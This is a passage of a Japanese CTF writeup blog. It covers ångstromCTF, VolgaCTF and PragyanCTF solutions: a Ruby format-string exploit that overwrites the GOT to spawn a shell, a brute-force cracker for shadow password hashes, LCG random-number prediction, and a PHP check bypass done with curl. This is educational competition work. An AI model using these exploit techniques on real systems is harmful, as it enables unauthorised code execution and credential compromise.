<li>Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ</li>
<li>libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う</li>
<li>出力バイトの関係から分割して書き込むために、はじめに<code>puts@got</code>をmainに書き換えておき何度もFSBを使えるようにする</li>
<li><code>__stack_chk_fail@got</code>は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える</li>
<li>最後に、<code>puts@got</code>を<code>__stack_chk_fail@got</code>になおしてあげればOne gadgetが実行される</li>
<li><strong>actf{no_returns_allowed}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: utf-8</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 8888</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19307</span>
context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc.so.6&#34;</span>
<span style="color:#408080;font-style:italic">#z = Sock.new &#34;shell.actf.co&#34;, 19011</span>
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

<span style="color:#408080;font-style:italic"># Leaking libc address and overwriting puts@got to the entrypoint of main function</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;%4518c%11$hnAAAABBB%17$p</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
data <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
data <span style="color:#666">=</span> data<span style="color:#666">.</span>gsub(<span style="color:#b68">/\s/</span>,<span style="color:#ba2121">&#34;&#34;</span>)
libc_start_main <span style="color:#666">=</span> data<span style="color:#666">.</span>match(<span style="color:#b68">/BBB(.*)@@\./</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>chop<span style="color:#666">.</span>to_i(<span style="color:#666">16</span>) <span style="color:#666">-</span> <span style="color:#666">240</span>
libc_base <span style="color:#666">=</span> libc_start_main <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#39;__libc_start_main&#39;</span><span style="color:#666">]</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;libc base address = </span><span style="color:#b68;font-weight:bold">#{</span>libc_base<span style="color:#666">.</span>to_s(<span style="color:#666">16</span>)<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">&#34;</span>

one_gadget <span style="color:#666">=</span> libc_base <span style="color:#666">+</span> <span style="color:#666">0xf02a4</span>
high <span style="color:#666">=</span> (one_gadget <span style="color:#666">&amp;</span> <span style="color:#666">0xffffffff00000000</span>) <span style="color:#666">&gt;&gt;</span> <span style="color:#666">32</span>
low <span style="color:#666">=</span> one_gadget <span style="color:#666">&amp;</span> <span style="color:#666">0xffffffff</span>
llow <span style="color:#666">=</span> (low <span style="color:#666">&amp;</span> <span style="color:#666">0xffff0000</span>) <span style="color:#666">&gt;&gt;</span> <span style="color:#666">16</span>
hlow <span style="color:#666">=</span> low <span style="color:#666">&amp;</span> <span style="color:#666">0xffff</span>

<span style="color:#408080;font-style:italic"># Overwriting __stack_chk_fail@got to one gadget RCE</span>
payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>high<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x2c\x40\x40</span><span style="color:#ba2121">&#34;</span>
z<span style="color:#666">.</span>sendline payload
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>hlow<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x28\x40\x40</span><span style="color:#ba2121">&#34;</span>
z<span style="color:#666">.</span>sendline payload
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>llow<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x2a\x40\x40</span><span style="color:#ba2121">&#34;</span>
z<span style="color:#666">.</span>sendline payload
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%4892c%11$hnAAAABBB%17$p</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
z<span style="color:#666">.</span>sendline payload

z<span style="color:#666">.</span>interact</code></pre></div>
  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/volga2019/" rel="bookmark">VolgaCTF 2019 writeup</a>
  </h2>
  
  <time datetime="2019-04-03T08:07:43&#43;09:00">
    3 April, 2019
  </time>
  
</header>
  

<h2 id="shadow-cat">Shadow cat</h2>

<ul>
<li><code>/etc/shadow</code>と<code>encrypted.txt</code>が渡される</li>
<li><code>/etc/shadow</code>には、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、<code>encrypted.txt</code>にはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる</li>
<li><code>/etc/shadow</code>のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;unix_crypt&#39;</span> <span style="color:#408080;font-style:italic"># gem install unix-crypt</span>
org <span style="color:#666">=</span> <span style="color:#666">[]</span>
ans <span style="color:#666">=</span> <span style="color:#666">[]</span>
lines <span style="color:#666">=</span> <span style="color:#800">File</span><span style="color:#666">.</span>read(<span style="color:#ba2121">&#34;./shadow.txt&#34;</span>)<span style="color:#666">.</span>split(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
lines<span style="color:#666">.</span>each <span style="color:#008000;font-weight:bold">do</span> <span style="color:#666">|</span>line<span style="color:#666">|</span>
  org <span style="color:#666">&lt;&lt;</span> line<span style="color:#666">.</span>split(<span style="color:#ba2121">&#34;:&#34;</span>)<span style="color:#666">[</span><span style="color:#666">0</span><span style="color:#666">]</span>
  enc <span style="color:#666">=</span> line<span style="color:#666">.</span>split(<span style="color:#ba2121">&#34;:&#34;</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">]</span>
  salt <span style="color:#666">=</span> line<span style="color:#666">.</span>split(<span style="color:#ba2121">&#34;$&#34;</span>)<span style="color:#666">[</span><span style="color:#666">2</span><span style="color:#666">]</span>
  
  <span style="color:#666">0x1f</span><span style="color:#666">.</span>upto(<span style="color:#666">0x7e</span>) <span style="color:#008000;font-weight:bold">do</span> <span style="color:#666">|</span>i<span style="color:#666">|</span>
    hashpass <span style="color:#666">=</span> <span style="color:#800">UnixCrypt</span><span style="color:#666">::</span><span style="color:#800">SHA512</span><span style="color:#666">.</span>build(i<span style="color:#666">.</span>chr, salt)
    <span style="color:#008000;font-weight:bold">if</span> hashpass <span style="color:#666">==</span> enc
      ans <span style="color:#666">&lt;&lt;</span> i<span style="color:#666">.</span>chr
      <span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;Passed&#34;</span>
      <span style="color:#008000;font-weight:bold">break</span>
    <span style="color:#008000;font-weight:bold">end</span>
  <span style="color:#008000;font-weight:bold">end</span>
<span style="color:#008000;font-weight:bold">end</span>

encrypted <span style="color:#666">=</span> <span style="color:#800">File</span><span style="color:#666">.</span>read(<span style="color:#ba2121">&#34;./encrypted.txt&#34;</span>)<span style="color:#666">.</span>chomp
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;VolgaCTF{</span><span style="color:#b68;font-weight:bold">#{</span>encrypted<span style="color:#666">.</span>tr(org<span style="color:#666">.</span>join(<span style="color:#ba2121">&#34;&#34;</span>), ans<span style="color:#666">.</span>join(<span style="color:#ba2121">&#34;&#34;</span>))<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">}&#34;</span></code></pre></div>
<ul>
<li><strong>VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}</strong></li>
</ul>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/predict_lcg/" rel="bookmark">線形合同法で生成される乱数値を予測する</a>
  </h2>
  
  <time datetime="2019-04-01T22:33:26&#43;09:00">
    1 April, 2019
  </time>
  
</header>
  

<h2 id="はじめに">はじめに</h2>

<p>線形合同法（LCG）とは、至極一般的かつ簡易に実装することができる乱数生成手法の1つです。先日行われたVolgaCTF 2019では、この線形合同法により生成される乱数値を予測する問題（問題名LG）が出題されました。本問題ではx0 ~ x6に相当する6つの乱数が表示され、それを元に次の値を算出する問題です。</p>

<h2 id="線形合同法">線形合同法</h2>

<p>線形合同法は、以下の式で定義されます。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">x1 = (a * x0 + c) % p</pre></div>
<p>このとき、x0は乱数のseed値、a, c, pがパラメータとなり適切な値を選びます。今回の問題では、x0 ~ x6までの値が与えられ、その次の値を入力するといったものでした。「a, c, pがわからないと無理じゃない？ｗ」と思ってしまったのですが、どうやら行列演算することで「a, c, p」を算出可能らしいです。</p>

<h2 id="線形合同法のパラメータの算出">線形合同法のパラメータの算出</h2>

<p>まずはじめに、各種x0 ~ x6を用いて以下の4つの行列を作成します。それらの行列式を用いて、各行列式の最大公約数(GCD)を算出します。これが、「p」に相当します。その後、(x3 - x4) と(x2 - x3)の法pにおける逆元を乗算し、再度pで割ると「a」になります。最後に、<code>(x4 - a * x3) % p</code>で割った際の剰余がcになる。以上の計算を行うコードを以下に示す。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#408080;font-style:italic">#!/usr/bin/env python</span>
<span style="color:#408080;font-style:italic">#coding: utf-8</span>

<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">math</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">numpy</span> <span style="color:#008000;font-weight:bold">as</span> <span style="color:#00f;font-weight:bold">np</span>

x0 <span style="color:#666">=</span> <span style="color:#666">64302589647963933737451564</span>
x1 <span style="color:#666">=</span> <span style="color:#666">23099347408308738343740115</span>
x2 <span style="color:#666">=</span> <span style="color:#666">60779187967701597680605077</span>
x3 <span style="color:#666">=</span> <span style="color:#666">41531243105709646792416331</span>
x4 <span style="color:#666">=</span> <span style="color:#666">71461317334046189800115379</span>
x5 <span style="color:#666">=</span> <span style="color:#666">50094315434186546595562390</span>
x6 <span style="color:#666">=</span> <span style="color:#666">27719142972686291997765807</span>

<span style="color:#408080;font-style:italic"># なんかnp.linalg.detがエラー吐くので作成</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">det</span>(matrix):
    <span style="color:#008000;font-weight:bold">return</span> matrix[<span style="color:#666">0</span>][<span style="color:#666">0</span>] <span style="color:#666">*</span> matrix[<span style="color:#666">1</span>][<span style="color:#666">1</span>] <span style="color:#666">-</span> matrix[<span style="color:#666">0</span>][<span style="color:#666">1</span>] <span style="color:#666">*</span> matrix[<span style="color:#666">1</span>][<span style="color:#666">0</span>]

<span style="color:#408080;font-style:italic"># https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">egcd</span>(a, b):
    <span style="color:#008000;font-weight:bold">if</span> a <span style="color:#666">==</span> <span style="color:#666">0</span>:
        <span style="color:#008000;font-weight:bold">return</span> (b, <span style="color:#666">0</span>, <span style="color:#666">1</span>)
    <span style="color:#008000;font-weight:bold">else</span>:
        g, y, x <span style="color:#666">=</span> egcd(b <span style="color:#666">%</span> a, a)
        <span style="color:#008000;font-weight:bold">return</span> (g, x <span style="color:#666">-</span> (b <span style="color:#666">//</span> a) <span style="color:#666">*</span> y, y)
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">modinv</span>(a, m):
    g, x, y <span style="color:#666">=</span> egcd(a, m)
    <span style="color:#008000;font-weight:bold">if</span> g <span style="color:#666">!=</span> <span style="color:#666">1</span>:
        <span style="color:#008000;font-weight:bold">raise</span> <span style="color:#d2413a;font-weight:bold">Exception</span>(<span style="color:#ba2121">&#39;modular inverse does not exist&#39;</span>)
    <span style="color:#008000;font-weight:bold">else</span>:
        <span style="color:#008000;font-weight:bold">return</span> x <span style="color:#666">%</span> m

matrix0 <span style="color:#666">=</span> np<span style="color:#666">.</span>array([
    [x1 <span style="color:#666">-</span> x0, x2 <span style="color:#666">-</span> x1],
    [x2 <span style="color:#666">-</span> x0, x3 <span style="color:#666">-</span> x1]
])

matrix1 <span style="color:#666">=</span> np<span style="color:#666">.</span>array([
    [x2 <span style="color:#666">-</span> x0, x3 <span style="color:#666">-</span> x1],
    [x3 <span style="color:#666">-</span> x0, x4 <span style="color:#666">-</span> x1]
])

matrix2 <span style="color:#666">=</span> np<span style="color:#666">.</span>array([
    [x3 <span style="color:#666">-</span> x0, x4 <span style="color:#666">-</span> x1],
    [x4 <span style="color:#666">-</span> x0, x5 <span style="color:#666">-</span> x1]
])

matrix3 <span style="color:#666">=</span> np<span style="color:#666">.</span>array([
    [x4 <span style="color:#666">-</span> x0, x5 <span style="color:#666">-</span> x1],
    [x5 <span style="color:#666">-</span> x0, x6 <span style="color:#666">-</span> x1]
])

p0 <span style="color:#666">=</span> math<span style="color:#666">.</span>gcd(det(matrix0), det(matrix1))
p1 <span style="color:#666">=</span> math<span style="color:#666">.</span>gcd(p0, det(matrix2))
p <span style="color:#666">=</span> math<span style="color:#666">.</span>gcd(p1, det(matrix3))

a <span style="color:#666">=</span> ((x3 <span style="color:#666">-</span> x4) <span style="color:#666">*</span> modinv(x2 <span style="color:#666">-</span> x3, p)) <span style="color:#666">%</span> p
c <span style="color:#666">=</span> (x4 <span style="color:#666">-</span> a <span style="color:#666">*</span> x3) <span style="color:#666">%</span> p

<span style="color:#008000;font-weight:bold">assert</span> x1 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x0 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">assert</span> x2 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x1 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">assert</span> x3 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x2 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">assert</span> x4 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x3 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">assert</span> x5 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x4 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">assert</span> x6 <span style="color:#666">==</span> (a <span style="color:#666">*</span> x5 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p, <span style="color:#ba2121">&#34;Not eqaul&#34;</span>
<span style="color:#008000;font-weight:bold">print</span>((a <span style="color:#666">*</span> x6 <span style="color:#666">+</span> c) <span style="color:#666">%</span> p) <span style="color:#408080;font-style:italic">#=&gt; 54571278391299526410540376</span></code></pre></div>
<h2 id="おわりに">おわりに</h2>

<p>本記事では、線形合同法における乱数値の予測方法についてまとめた。パラメータが不明な場合でも本手法を用いることで解読なので覚えておきたい。</p>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/pragyan2019/" rel="bookmark">PragyanCTF 2019 writeup</a>
  </h2>
  
  <time datetime="2019-03-10T22:48:37&#43;09:00">
    10 March, 2019
  </time>
  
</header>
  

<h2 id="welcome">Welcome</h2>

<ul>
<li>JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す</li>
<li>取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される</li>
<li>bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード</li>
<li>zipを展開するとpngファイルがでてくる</li>
<li>stegosolveで適当にぽちぽちやるとFLAG</li>
<li><code>pctf{st3gs0lv3_1s_u53ful}</code></li>
</ul>

<h2 id="cookie-monster">Cookie Monster</h2>

<ul>
<li>Cookieにflagというフィールドがあり、MD5が設定されている</li>
<li>どこかのMD5クラックサイトで検索すると<code>pc</code>がでてくる</li>
<li>フラグフォーマットは、<code>pctf{</code>なのでひたすらこのCookieのMD5の元を考えれば良いとわかる</li>
<li><code>pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}</code></li>
</ul>

<h2 id="feed-me">Feed_me</h2>

<ul>
<li>バイナリを読むと、渡された乱数3つがチェック用の値になっている</li>
<li>入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数
<code>
x + y = a1
y + z = a2
x + z = a3
</code></li>
<li>自分が解いたときのケース
<code>
Can you cook my favourite food using these ingredients :)
-10026 ; -8250 ; -12490 ;
-000007133-000002893-000005357
That's yummy.... Here is your gift:
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
</code></li>
</ul>

<h2 id="game-of-faces">Game of Faces</h2>

<ul>
<li>ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える</li>
<li>適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる</li>
<li>ファイル名で直接アクセスするとフラグ</li>
<li><code>pctf{You_L00K_Wi3Rd_IN_H3R3}</code></li>
</ul>

<h2 id="easy-rsa">Easy RSA</h2>

<ul>
<li>e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&rsquo;s Attackだとわかる</li>
<li>コード書いて、秘密鍵dを計算すると<code>12978409760901509356642421072925801006324287746872153539187221529835976408177</code>だとわかる</li>
<li>あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ</li>
<li><code>pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}</code></li>
</ul>

<h2 id="late-pr">Late PR</h2>

<ul>
<li>課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される</li>
<li>vol.pyでプロセスを見るとchrome.exeがexitしていることがわかり、GoogleChromeCrashHandler.exeというプロセスの存在に気づくので、当該プロセスのメモリダンプを見てみるとフラグ

<ul>
<li><code>vol.py -f *.raw --profile Win7SP1x86_23418 pslist</code></li>
<li><code>vol.py -f *.raw --profile Win7SP1x86_23418 memdump --dump-dir .</code></li>
<li><code>strings 468.dmp | grep pctf</code></li>
</ul></li>
<li><code>pctf{Late_submissions_can_be_good}</code></li>
</ul>

<h2 id="mandatory-php">Mandatory PHP</h2>

<ul>
<li>以下のPHPのコードが渡される</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#bc7a00">&lt;?php</span> 
<span style="color:#008000;font-weight:bold">include</span> <span style="color:#ba2121">&#39;flag.php&#39;</span>; 
highlight_file(<span style="color:#ba2121">&#39;index.php&#39;</span>); 
<span style="color:#19177c">$a</span> <span style="color:#666">=</span> <span style="color:#19177c">$_GET</span>[<span style="color:#ba2121">&#34;val1&#34;</span>]; 
<span style="color:#19177c">$b</span> <span style="color:#666">=</span> <span style="color:#19177c">$_GET</span>[<span style="color:#ba2121">&#34;val2&#34;</span>]; 
<span style="color:#19177c">$c</span> <span style="color:#666">=</span> <span style="color:#19177c">$_GET</span>[<span style="color:#ba2121">&#34;val3&#34;</span>]; 
<span style="color:#19177c">$d</span> <span style="color:#666">=</span> <span style="color:#19177c">$_GET</span>[<span style="color:#ba2121">&#34;val4&#34;</span>]; 
<span style="color:#008000;font-weight:bold">if</span>(preg_match(<span style="color:#ba2121">&#39;/[^A-Za-z]/&#39;</span>, <span style="color:#19177c">$a</span>)) 
<span style="color:#008000;font-weight:bold">die</span>(<span style="color:#ba2121">&#39;oh my gawd...&#39;</span>); 
<span style="color:#19177c">$a</span><span style="color:#666">=</span>hash(<span style="color:#ba2121">&#34;sha256&#34;</span>,<span style="color:#19177c">$a</span>); 
<span style="color:#19177c">$a</span><span style="color:#666">=</span>(log10(<span style="color:#19177c">$a</span><span style="color:#666">**</span>(<span style="color:#666">0.5</span>)))<span style="color:#666">**</span><span style="color:#666">2</span>; 
<span style="color:#008000;font-weight:bold">if</span>(<span style="color:#19177c">$c</span><span style="color:#666">&gt;</span><span style="color:#666">0</span><span style="color:#666">&amp;&amp;</span><span style="color:#19177c">$d</span><span style="color:#666">&gt;</span><span style="color:#666">0</span><span style="color:#666">&amp;&amp;</span><span style="color:#19177c">$d</span><span style="color:#666">&gt;</span><span style="color:#19177c">$c</span><span style="color:#666">&amp;&amp;</span><span style="color:#19177c">$a</span><span style="color:#666">==</span><span style="color:#19177c">$c</span><span style="color:#666">*</span><span style="color:#19177c">$c</span><span style="color:#666">+</span><span style="color:#19177c">$d</span><span style="color:#666">*</span><span style="color:#19177c">$d</span>) 
<span style="color:#19177c">$s1</span><span style="color:#666">=</span><span style="color:#ba2121">&#34;true&#34;</span>; 
<span style="color:#008000;font-weight:bold">else</span> 
    <span style="color:#008000;font-weight:bold">die</span>(<span style="color:#ba2121">&#34;Bye...&#34;</span>); 
<span style="color:#008000;font-weight:bold">if</span>(<span style="color:#19177c">$s1</span><span style="color:#666">===</span><span style="color:#ba2121">&#34;true&#34;</span>) 
    <span style="color:#008000;font-weight:bold">echo</span> <span style="color:#19177c">$flag1</span>; 
<span style="color:#008000;font-weight:bold">for</span>(<span style="color:#19177c">$i</span><span style="color:#666">=</span><span style="color:#666">1</span>;<span style="color:#19177c">$i</span><span style="color:#666">&lt;=</span><span style="color:#666">10</span>;<span style="color:#19177c">$i</span><span style="color:#666">++</span>){ 
    <span style="color:#008000;font-weight:bold">if</span>(<span style="color:#19177c">$b</span><span style="color:#666">==</span>urldecode(<span style="color:#19177c">$b</span>)) 
        <span style="color:#008000;font-weight:bold">die</span>(<span style="color:#ba2121">&#39;duck&#39;</span>); 
    <span style="color:#008000;font-weight:bold">else</span> 
        <span style="color:#19177c">$b</span><span style="color:#666">=</span>urldecode(<span style="color:#19177c">$b</span>); 
}     
<span style="color:#008000;font-weight:bold">if</span>(<span style="color:#19177c">$b</span><span style="color:#666">===</span><span style="color:#ba2121">&#34;WoAHh!&#34;</span>) 
<span style="color:#19177c">$s2</span><span style="color:#666">=</span><span style="color:#ba2121">&#34;true&#34;</span>; 
<span style="color:#008000;font-weight:bold">else</span> 
    <span style="color:#008000;font-weight:bold">die</span>(<span style="color:#ba2121">&#39;oops..&#39;</span>); 
<span style="color:#008000;font-weight:bold">if</span>(<span style="color:#19177c">$s2</span><span style="color:#666">===</span><span style="color:#ba2121">&#34;true&#34;</span>) 
    <span style="color:#008000;font-weight:bold">echo</span> <span style="color:#19177c">$flag2</span>; 
<span style="color:#008000;font-weight:bold">die</span>(<span style="color:#ba2121">&#39;end...&#39;</span>); 
<span style="color:#bc7a00">?&gt;</span> 
</code></pre></div>
<ul>
<li><code>val1</code>が<code>INF</code>になるので、<code>val3</code>と<code>val4</code>でINFになるようにデカイ数を渡して、<code>val2</code>は10回urldecodeして<code>WoAHh!</code>になるようにパラメータを渡せば良い</li>
<li><code>curl 'http://159.89.166.12:14000///index.php?ffval1=0&amp;val2=WoAHh%2525252525252525252521&amp;val3=101&amp;val4=大きい値'</code></li>
<li><code>pctf{b3_c4r3fu1_w1th_pHp_f31145}</code></li>
</ul>

<h2 id="終了後に解いた問題">終了後に解いた問題</h2>

<h3 id="magic-pngs">Magic PNGs</h3>

<ul>
<li>パスワード付きzipとpngファイルが渡されるが、<code>file</code>コマンドを叩くと<code>data</code>都市てか表示されないためヘッダーなどが間違っていると推測できる</li>
<li>案の定Magic numberが間違っているので修正するが、それでも開かない</li>
<li>PNGは通常IDATチャンクがあるはずだが、そのキーワードが<code>idat</code>と小文字になっていたのでこれを修正すると開けて、<code>h4CK3RM4n</code>が読み取れる</li>
<li>ヒントから、この値をmd5してパスワードzipを展開するとフラグ</li>
<li><code>pctf{y0u_s33_m33_n0w!}</code></li>
<li><strong>ファイルヘッダーとかが違うところに気づいていなかった</strong></li>
</ul>

<h3 id="exorcism">EXORcism</h3>

<ul>
<li>大量の1と0があるファイルを渡される</li>
<li>100x100の正方形に整形して、1をスペース、0は黒として描画するとQRコードになる</li>
<li>QRコードを読み取ると、<code>160f15011d1b095339595138535f135613595e1a</code></li>
<li>タイトルがXORなので、この文字列となにかをxorする必要があると推測できる</li>
<li>フラグフォーマットの<code>pctf{</code>になるようにxorする値を計算すると<code>flagf</code>になるので、<code>flag</code>を繰り返してxorすれば良いとわかるので、それで計算するとフラグ</li>
<li><code>pctf{wh4_50_53r1u5?}</code></li>
<li><strong>そもそもQRコードになるなんて想像ができなかった</strong></li>
</ul>

<h2 id="save-earth">Save Earth</h2>

<ul>
<li>USBパケットのデータが渡されて入力した値を求めさせる</li>
<li>データ内にasciiがないので、間隔つまりモールス信号だと推測する</li>
<li>USBパケットの末尾のデータ部から4をスペース、1と2をそれぞれモールス信号にするとフラグが得られる</li>
<li><code>CTFS4V3</code></li>
</ul>

  
</article>


<nav>
  
  <a href="https://owlinux1000.github.io/blog/page/2/" class="Pagination u-clickable">« Previous</a>
  
  
</nav>



      </div>
    </div>
  </main>
  
<footer class="Footer">
  <div class="u-wrapper">
    <div class="u-padding">
      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
    </div>
  </div>
</footer>

  
</body>
</html>